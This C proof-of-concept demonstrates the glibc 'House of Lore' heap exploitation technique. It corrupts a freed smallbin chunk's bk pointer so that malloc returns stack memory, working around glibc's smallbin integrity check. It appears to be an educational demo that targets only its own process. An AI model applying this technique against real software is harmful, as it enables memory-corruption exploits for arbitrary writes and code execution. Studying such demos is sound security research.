/*
Advanced exploitation of the House of Lore - Malloc Maleficarum.
This PoC take care also of the glibc hardening of smallbin corruption.
[ ... ]
else
    {
      bck = victim->bk;
    if (__glibc_unlikely (bck->fd != victim)){
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
       set_inuse_bit_at_offset (victim, nb);
       bin->bk = bck;
       bck->fd = bin;
       [ ... ]
*/
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>
int main(int argc, char *argv[])
{
       intptr_t *stack_buffer_1[0x110] = { 0 };
       intptr_t *stack_buffer_2[0x110] = { 0 };
       void *fake_freelist[7][0x110];
       intptr_t *victim = malloc(0x100);
       void *dummies[7];
       for (int i = 0; i < 7; i++) dummies[i] = malloc(0x100);
       // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
       intptr_t *victim_chunk = victim - 2;
       for (int i = 0; i < 6; i++) {
              fake_freelist[i][3] = fake_freelist[i + 1];
       }
       fake_freelist[6][3] = NULL;
       stack_buffer_1[0] = 0;
       stack_buffer_1[1] = 0;
       stack_buffer_1[2] = victim_chunk;
       stack_buffer_1[3] = (intptr_t *)stack_buffer_2;
       stack_buffer_2[2] = (intptr_t *)stack_buffer_1;
       stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
       void *p5 = malloc(1000);
       for (int i = 0; i < 7; i++) free(dummies[i]);
       free((void *)victim);
       void *p2 = malloc(1200);
       //------------VULNERABILITY-----------
       victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack
       //------------------------------------
       for (int i = 0; i < 7; i++) malloc(0x100);
       void *p3 = malloc(0x100);
       char *p4 = malloc(0x100);
       // this chunk will be allocated on stack
       assert((void *)fake_freelist[4] + 0x10 == p4);
       memset((void *)fake_freelist[4] + 0x10, 'A', 0x100);
       assert(strstr(p4, "AAAAAAAAAAAA") != NULL);
}
